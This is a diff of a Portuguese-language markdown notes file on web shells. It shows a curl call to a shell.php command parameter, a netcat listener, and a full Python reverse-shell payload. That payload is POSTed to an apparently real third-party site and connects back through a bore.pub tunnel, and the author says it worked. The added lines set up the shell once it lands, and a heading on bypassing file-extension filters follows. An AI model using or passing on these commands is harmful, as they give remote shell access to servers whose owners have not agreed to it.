@@ -115,6 +115,8 @@ curl "http://example.com/shell.php?cmd=whoami"
 - (ele vai fornecer algo como bore.pub:24966)
 - nc -lvnp 4444  # Porta do bore local
 - e depois o payload que funcionou pra mim `curl -X POST --data-urlencode "pass=system('python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"bore.pub\\\",24966));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")\"');" https://pil.loyolavirtual.net/by.php`
+- export TERM=xterm
+bash
 ---
 ## Tecnicas de bypass de extensão shell </br>
 <img width="542" height="848" alt="image" src="https://github.com/user-attachments/assets/af956b20-0722-46e8-9d86-e8e386792023" />
